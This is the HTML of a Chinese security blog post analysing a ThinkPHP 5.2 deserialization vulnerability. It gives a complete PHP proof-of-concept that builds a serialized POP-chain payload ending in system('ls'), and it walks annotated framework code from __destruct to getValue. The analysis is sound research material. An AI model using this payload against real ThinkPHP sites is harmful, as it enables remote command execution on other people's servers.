@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lnva9say.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="啊啊啊啊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP5.2x反序列化漏洞分析">
+<meta property="og:url" content="https://lnva9say.top/2020/03/20/TP5-2x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="baishuo">
+<meta property="og:description" content="啊啊啊啊">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-20T05:19:43.000Z">
+<meta property="article:modified_time" content="2020-04-18T09:55:31.597Z">
+<meta property="article:author" content="baishuo">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://lnva9say.top/2020/03/20/TP5-2x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>TP5.2x反序列化漏洞分析 | baishuo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">baishuo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lnva9say.top/2020/03/20/TP5-2x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/baishuo.jpg">
+      <meta itemprop="name" content="baishuo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baishuo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TP5.2x反序列化漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-20 13:19:43" itemprop="dateCreated datePublished" datetime="2020-03-20T13:19:43+08:00">2020-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-18 17:55:31" itemprop="dateModified" datetime="2020-04-18T17:55:31+08:00">2020-04-18</time>
+              </span>
+
+          
+            <div class="post-description">啊啊啊啊</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=<span class="number">5.2</span>.*-dev v5<span class="number">.2</span></span><br></pre></td></tr></table></figure>
+
+<p>tp5.2反序列化大致与tp5.1pop链相同</p>
+<h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;__destruct()</span><br><span class="line"> think\process\pipes\Windows-&gt;removeFiles()</span><br><span class="line"> think\model\concern\Conversion-&gt;__toString()</span><br><span class="line"> think\model\concern\Conversion-&gt;toJson()</span><br><span class="line"> think\model\concern\Conversion-&gt;toArray()</span><br><span class="line"> think\model\concern\Attribute-&gt;getAttr()</span><br><span class="line"> think\model\concern\Attribute-&gt;getValue()</span><br></pre></td></tr></table></figure>
+
+<p>可见一直到getAttr() 链都一样 只是从toArray开始有了变化。。。</p>
+<p>先贴个POC</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($files)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [$files];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [<span class="string">"lin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span> =&gt; <span class="string">"ls"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    $<span class="title">conver</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>();</span><br><span class="line">    $payload = <span class="keyword">new</span> think\process\pipes\Windows($conver);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过触发<strong>destruc()方法中的<code>removeFiles()</code>，该函数内用了一个<code>file_exists()</code>方法处理对象实例时会当成字符串，从而触发`</strong>toString()<code>，调用</code>toJson()<code>=&gt;</code>toArray()<code>=&gt;</code>getAttr()<code>，最后在</code>getValue()`处调用动态函数导致命令执行。</p>
+<h4 id="跳转到toArray"><a href="#跳转到toArray" class="headerlink" title="跳转到toArray"></a>跳转到toArray</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		.......</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;visible <span class="keyword">as</span> $key =&gt; $val) &#123;    </span><br><span class="line">         <span class="comment">//$this-&gt;visible默认值为空，无关函数，跳过            </span></span><br><span class="line">         ......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;hidden <span class="keyword">as</span> $key =&gt; $val) &#123;          </span><br><span class="line">        <span class="comment">//$this-&gt;hidden默认值为空，无关函数，跳过</span></span><br><span class="line">        ......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation); <span class="comment">//将两个数组合并成一个数组，在poc中给了$this-&gt;data=["lin" =&gt; "ls"],所以$data = ["lin" =&gt; "ls"]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;  <span class="comment">//遍历$data数组 //$key = lin,$val=ls</span></span><br><span class="line">            <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123; <span class="comment">//判断$val是不是这两个类的实例，不是，跳过执行下一步</span></span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                    $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">                    $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                $item[$key] = $val-&gt;toArray();</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;   <span class="comment">//$this-&gt;visible[$key]值为空不存在，跳过</span></span><br><span class="line">                $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;  <span class="comment">//符合</span></span><br><span class="line">                $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key); <span class="comment">//跟进getAttr,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="getAttr"><a href="#getAttr" class="headerlink" title="getAttr"></a>getAttr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function getAttr(string $name) &#x2F;&#x2F;$name &#x3D; $key&#x3D;&#39;lin&#39;  可控</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        $relation &#x3D; false;</span><br><span class="line">        $value    &#x3D; $this-&gt;getData($name); &#x2F;&#x2F;跟进getData,得知返回值可控，$value&#x3D;&#39;ls&#39;可控</span><br><span class="line">    &#125; catch (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation &#x3D; true;</span><br><span class="line">        $value    &#x3D; null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $this-&gt;getValue($name, $value, $relation); &#x2F;&#x2F;$name&#x3D;&#39;lin&#39;、$value&#x3D;&#39;ls&#39;可控，且 $relation &#x3D; false，跟进getvalue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="getData"><a href="#getData" class="headerlink" title="getData"></a>getData</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public function getData(string $name = null) //$name可控，</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;<span class="comment">//判断是否为空，则不为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);<span class="comment">//跟进，得知$fieldName = $name</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123; <span class="comment">//检查是否存在$name //$this-&gt;data=['lin'=&gt;'ls']</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName]; <span class="comment">//返回getAttr,返回值为'ls'	</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="getRealFieldName"><a href="#getRealFieldName" class="headerlink" title="getRealFieldName"></a>getRealFieldName</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected function getRealFieldName(string $name): string  //$name='lin'</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? $name : App::parseName($name); <span class="comment">//$this-&gt;strict=$name='lin'  判断是否严格字段大小写，默认为true</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//$name='lin' $value='ls' $relation=false</span></span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);<span class="comment">//默认返回原数据</span></span><br><span class="line">    $method    = <span class="string">'get'</span> . App::parseName($name, <span class="number">1</span>) . <span class="string">'Attr'</span>;<span class="comment">//拼接字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;<span class="comment">//$this-&gt;withAttr 可控</span></span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123;<span class="comment">//false </span></span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];  <span class="comment">//withAttr可控、$value 可控，令$closure=system，</span></span><br><span class="line">        $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">////system('ls',$this-&gt;data)，命令执行</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (method_exists(<span class="keyword">$this</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123;<span class="comment">//false </span></span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;$method($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[$fieldName])) &#123;</span><br><span class="line">        <span class="comment">// 类型转换</span></span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;readTransform($value, <span class="keyword">$this</span>-&gt;type[$fieldName]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [<span class="keyword">$this</span>-&gt;createTime, <span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;getTimestampValue($value);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($relation) &#123;</span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;getRelationAttribute($name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由此可见在getvalu()函数处getvalue</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6619#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619#toc-2</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/19/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="TP5.1反序列化漏洞分析">
+      <i class="fa fa-chevron-left"></i> TP5.1反序列化漏洞分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/20/linux%E4%B8%8B%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="next" title="linux下的应急响应">
+      linux下的应急响应 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pop链"><span class="nav-number">2.</span> <span class="nav-text">pop链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">3.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#跳转到toArray"><span class="nav-number">4.0.1.</span> <span class="nav-text">跳转到toArray</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getAttr"><span class="nav-number">4.0.2.</span> <span class="nav-text">getAttr</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getData"><span class="nav-number">4.1.</span> <span class="nav-text">getData</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getRealFieldName"><span class="nav-number">4.1.1.</span> <span class="nav-text">getRealFieldName</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getValue"><span class="nav-number">4.1.2.</span> <span class="nav-text">getValue</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baishuo"
+      src="/images/baishuo.jpg">
+  <p class="site-author-name" itemprop="name">baishuo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">baishuo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
